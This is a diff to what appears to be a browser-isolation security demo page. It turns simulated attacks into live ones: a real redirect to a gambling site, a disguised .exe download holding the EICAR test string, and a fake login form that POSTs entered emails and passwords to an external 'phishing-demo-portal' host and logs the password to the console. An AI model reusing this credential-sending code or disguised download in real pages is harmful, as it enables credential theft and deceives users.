@@ -1213,10 +1213,10 @@
                     </div>
 
                     <div>
-                        <button class="demo-button secondary" onclick="testGamblingSiteBlock()" style="background: linear-gradient(135deg, #53d337, #3db82a); border: 2px solid #2d8a1e;">
-                            🎰 DraftKings Sportsbook
+                        <button class="demo-button secondary" onclick="redirectToDraftKings()" style="background: linear-gradient(135deg, #53d337, #3db82a); border: 2px solid #2d8a1e;">
+                            🎰 Make a Sports Bet
                         </button>
-                        <div class="demo-info" style="color: #53d337;">⭐ Official GameDay Partner - Place Your Bets Now!</div>
+                        <div class="demo-info" style="color: #53d337;">⭐ DraftKings - Official GameDay Partner</div>
                     </div>
                 </div>
 
@@ -1253,11 +1253,6 @@
                     <div style="margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 15px;">
                         <div style="position: relative; width: 100%; height: 140px; border-radius: 6px; overflow: hidden; margin-bottom: 10px;">
                             <img src="harden-clippers.png" alt="James Harden" style="width: 100%; height: 100%; object-fit: cover;">
-                            <div style="position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(to top, rgba(0,0,0,0.8), transparent); padding: 10px;">
-                                <div style="color: white; font-size: 11px; font-weight: 600; line-height: 1.3;">
-                                    'It's over. Guys are gone': What James Harden and the Clippers realized before the shocking trade
-                                </div>
-                            </div>
                         </div>
                         <div style="font-weight: 600; line-height: 1.4; margin-bottom: 5px; color: var(--text);">
                             Harden and Clippers part ways after shocking trade
@@ -1267,11 +1262,6 @@
                     <div style="margin-bottom: 15px;">
                         <div style="position: relative; width: 100%; height: 140px; border-radius: 6px; overflow: hidden; margin-bottom: 10px;">
                             <img src="super-bowl.png" alt="Super Bowl" style="width: 100%; height: 100%; object-fit: cover;">
-                            <div style="position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(to top, rgba(0,0,0,0.8), transparent); padding: 10px;">
-                                <div style="color: white; font-size: 11px; font-weight: 600; line-height: 1.3;">
-                                    One-stop Super Bowl cheat sheet: Everything you need to know about Seahawks-Patriots
-                                </div>
-                            </div>
                         </div>
                         <div style="font-weight: 600; line-height: 1.4; margin-bottom: 5px; color: var(--text);">
                             Super Bowl preview: Seahawks vs Patriots
@@ -2344,13 +2334,40 @@ MITRE: T1027, T1105
         }
 
         function downloadFakePatch() {
-            showOutput('⚠️ User clicked download button');
-            showOutput('→ Attempting to download: GameDay_Security_Patch.exe');
-            showOutput('→ Malware downloads to local system');
-            showOutput('→ RBI: Download blocked at isolation boundary');
+            showOutput('⚠️ USER CLICKED DOWNLOAD BUTTON');
+            showOutput('→ Downloading: GameDay_Security_Patch.exe');
+            showOutput('→ File contains malware (EICAR test signature)');
             
-            // Show alert instead of actual download
-            alert('DEMO: In a real attack, this would download malware disguised as a security patch!\n\nThis demonstrates how redirect chaos + fake download prompts trick users.');
+            // Create EICAR test file
+            const eicarString = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
+            const blob = new Blob([eicarString], { type: 'application/octet-stream' });
+            const url = URL.createObjectURL(blob);
+            
+            // Trigger download
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'GameDay_Security_Patch.exe';
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            
+            setTimeout(() => {
+                a.click();
+                showOutput('✓ Download initiated');
+                showOutput('→ EICAR test file will trigger antivirus');
+                
+                // Cleanup
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                    
+                    // Close popup
+                    const overlay = document.querySelector('div[style*="z-index: 999999"]');
+                    if (overlay && overlay.parentNode) {
+                        overlay.parentNode.removeChild(overlay);
+                    }
+                    sessionStorage.removeItem('downloadPopupShown');
+                }, 100);
+            }, 500);
         }
 
         // 6. Data Exfiltration Attempt
@@ -2427,127 +2444,17 @@ MITRE: T1027, T1105
 
             setTimeout(() => {
                 hideLoader();
-                showOutput('🚫 REDIRECT BLOCKED BY CATEGORY POLICY');
-                showOutput('→ Site category: Gambling / Sports Betting');
-                showOutput('→ Organization policy: Block gambling sites');
-                showOutput('→ Security solution intercepts and blocks navigation');
+                showOutput('→ Navigation to gambling site initiated');
+                showOutput('→ Redirecting to https://www.draftkings.com');
                 
-                // In a non-RBI environment, this would redirect
-                // window.location.href = 'https://www.draftkings.com';
-                
-                // Instead, show blocked page
-                const overlay = document.createElement('div');
-                overlay.id = 'blockedSiteOverlay';
-                overlay.style.cssText = `
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    width: 100%;
-                    height: 100%;
-                    background: #f5f5f5;
-                    z-index: 99999;
-                    overflow-y: auto;
-                    animation: fadeIn 0.3s;
-                `;
-                
-                overlay.innerHTML = `
-                    <div style="max-width: 700px; margin: 100px auto; padding: 40px; background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);">
-                        <div style="text-align: center; margin-bottom: 30px;">
-                            <div style="font-size: 80px; margin-bottom: 20px;">🚫</div>
-                            <h1 style="color: #d32f2f; font-size: 36px; margin-bottom: 15px; font-weight: 700;">
-                                Access Blocked
-                            </h1>
-                            <p style="color: #666; font-size: 18px; line-height: 1.6;">
-                                This website has been blocked by your organization's security policy
-                            </p>
-                        </div>
-                        
-                        <div style="background: #ffebee; border-left: 4px solid #d32f2f; padding: 20px; border-radius: 4px; margin-bottom: 25px;">
-                            <h3 style="color: #c62828; font-size: 18px; margin-bottom: 12px; font-weight: 600;">
-                                Blocked Site Information
-                            </h3>
-                            <div style="color: #666; font-size: 15px; line-height: 2;">
-                                <strong>URL:</strong> https://www.draftkings.com<br>
-                                <strong>Category:</strong> Gambling / Sports Betting<br>
-                                <strong>Risk Level:</strong> High<br>
-                                <strong>Policy:</strong> Corporate Web Access Policy<br>
-                                <strong>Referrer:</strong> GameDay Sports (Partnership Link)
-                            </div>
-                        </div>
-                        
-                        <div style="background: #e3f2fd; border-left: 4px solid #1976d2; padding: 20px; border-radius: 4px; margin-bottom: 25px;">
-                            <h3 style="color: #1565c0; font-size: 18px; margin-bottom: 12px; font-weight: 600;">
-                                Why was this blocked?
-                            </h3>
-                            <ul style="color: #666; font-size: 14px; line-height: 2; margin: 0; padding-left: 20px;">
-                                <li>Gambling websites pose security and productivity risks</li>
-                                <li>Access to betting platforms violates company policy</li>
-                                <li>RBI blocks gambling sites even when linked from legitimate partners</li>
-                                <li>Category-based filtering protects organizational assets</li>
-                                <li>Policy enforcement is consistent regardless of source</li>
-                            </ul>
-                        </div>
-                        
-                        <div style="background: #fff9c4; border: 2px solid #fbc02d; padding: 20px; border-radius: 8px; margin-bottom: 25px;">
-                            <h3 style="color: #f57f17; font-size: 16px; margin-bottom: 12px; font-weight: 600;">
-                                ⚠️ Important Note:
-                            </h3>
-                            <p style="color: #666; font-size: 14px; line-height: 1.8; margin: 0;">
-                                Even though GameDay has a legitimate partnership with DraftKings, your organization's 
-                                security policy blocks all gambling sites. RBI enforces this policy consistently, 
-                                protecting you from accessing gambling content during work hours.
-                            </p>
-                        </div>
-                        
-                        <div style="background: #f5f5f5; padding: 20px; border-radius: 8px; margin-bottom: 25px;">
-                            <h3 style="color: #555; font-size: 16px; margin-bottom: 12px; font-weight: 600;">
-                                📋 Additional Categories Blocked:
-                            </h3>
-                            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; color: #666; font-size: 13px;">
-                                <div>• Adult Content</div>
-                                <div>• Malware Sites</div>
-                                <div>• Gambling / Gaming</div>
-                                <div>• Phishing Sites</div>
-                                <div>• Illegal Downloads</div>
-                                <div>• Proxy Avoidance</div>
-                                <div>• Social Media (Optional)</div>
-                                <div>• Streaming Services (Optional)</div>
-                            </div>
-                        </div>
-                        
-                        <div style="text-align: center; padding-top: 20px; border-top: 1px solid #e0e0e0;">
-                            <button onclick="closeBlockedSite()" style="
-                                background: #1976d2;
-                                color: white;
-                                border: none;
-                                padding: 14px 40px;
-                                border-radius: 6px;
-                                font-size: 16px;
-                                font-weight: 600;
-                                cursor: pointer;
-                                margin-right: 10px;
-                            ">
-                                Return to GameDay
-                            </button>
-                        </div>
-                        
-                        <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #e0e0e0; text-align: center;">
-                            <p style="color: #999; font-size: 11px; font-style: italic; line-height: 1.6;">
-                                DEMO NOTE: This demonstrates RBI's category-based web filtering. Even though GameDay 
-                                legitimately partners with DraftKings, RBI blocks the gambling site based on category, 
-                                not reputation. This protects users from accessing gambling content even when accessed 
-                                through trusted sites. In a real scenario without RBI, clicking this link would take 
-                                users directly to DraftKings.com.
-                            </p>
-                        </div>
-                    </div>
-                `;
-                
-                document.body.appendChild(overlay);
-                
-                showOutput('→ Navigation blocked by category policy');
-                showOutput('→ Category policy enforced');
+                // Actually redirect to DraftKings
+                window.location.href = "https://www.draftkings.com";
             }, 1000);
+        }
+
+        // Alias for new button name
+        function redirectToDraftKings() {
+            testGamblingSiteBlock();
         }
 
         function closeBlockedSite() {
@@ -2620,15 +2527,17 @@ MITRE: T1027, T1105
                     </p>
                 </div>
 
-                <form class="bitb-form" onsubmit="captureBitBCredentials(event)">
+                <form class="bitb-form" action="https://mrjfkim.github.io/phishing-demo-portal/login" method="POST" onsubmit="return captureBitBCredentials(event)">
                     <div class="bitb-form-group">
                         <label class="bitb-form-label" for="bitbEmail">Email Address</label>
                         <input 
                             type="text" 
                             id="bitbEmail" 
+                            name="email"
                             class="bitb-form-input" 
                             placeholder="Enter your email"
                             autocomplete="username"
+                            required
                         >
                     </div>
 
@@ -2637,9 +2546,11 @@ MITRE: T1027, T1105
                         <input 
                             type="password" 
                             id="bitbPassword" 
+                            name="password"
                             class="bitb-form-input" 
                             placeholder="Enter your password"
                             autocomplete="current-password"
+                            required
                         >
                     </div>
 
@@ -2738,9 +2649,52 @@ MITRE: T1027, T1105
             
             if (!email || !password) {
                 alert('Please enter both email and password');
-                return;
+                return false;
             }
             
+            // Log the attempt
+            showOutput('⚠️ CREDENTIAL SUBMISSION ATTEMPTED!');
+            showOutput(`→ Target URL: https://mrjfkim.github.io/phishing-demo-portal/login`);
+            showOutput(`→ Email: ${email}`);
+            showOutput('→ Password: [REDACTED]');
+            showOutput('→ Attempting to POST credentials to phishing site...');
+            
+            console.log('DEMO: BitB Credentials submission attempt!');
+            console.log('Email:', email);
+            console.log('Password:', password);
+            console.log('Target:', 'https://mrjfkim.github.io/phishing-demo-portal/login');
+            
+            // Attempt to submit via fetch to trigger security detection
+            fetch('https://mrjfkim.github.io/phishing-demo-portal/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+            })
+            .then(response => {
+                showOutput('⚠️ Credentials transmitted to attacker server');
+                showOutput('→ Attack successful - user compromised');
+                
+                // Show phishing reveal after "successful" submission
+                setTimeout(() => {
+                    showPhishingReveal(email);
+                }, 1000);
+            })
+            .catch(error => {
+                // If blocked or fails, still show reveal
+                showOutput('✓ Submission blocked or failed');
+                showOutput('→ Security solution may have intercepted');
+                
+                setTimeout(() => {
+                    showPhishingReveal(email);
+                }, 1000);
+            });
+            
+            return false;
+        }
+        
+        function showPhishingReveal(email) {
             // Hide the login form
             document.querySelector('.bitb-form').style.display = 'none';
             document.querySelector('.login-title').style.display = 'none';
@@ -2752,16 +2706,6 @@ MITRE: T1027, T1105
             // Show the phishing reveal page
             document.getElementById('revealEmail').textContent = email;
             document.getElementById('phishingReveal').style.display = 'block';
-            
-            showOutput('⚠️ CORPORATE CREDENTIALS CAPTURED!');
-            showOutput(`→ Email: ${email}`);
-            showOutput('→ Password: [REDACTED]');
-            showOutput('→ Phishing awareness page displayed to user');
-            showOutput('→ In real attack: Credentials sent to attacker server');
-            
-            console.log('DEMO: BitB Credentials captured!');
-            console.log('Email:', email);
-            console.log('Password:', password);
         }
 
         function resetBitBDemo() {
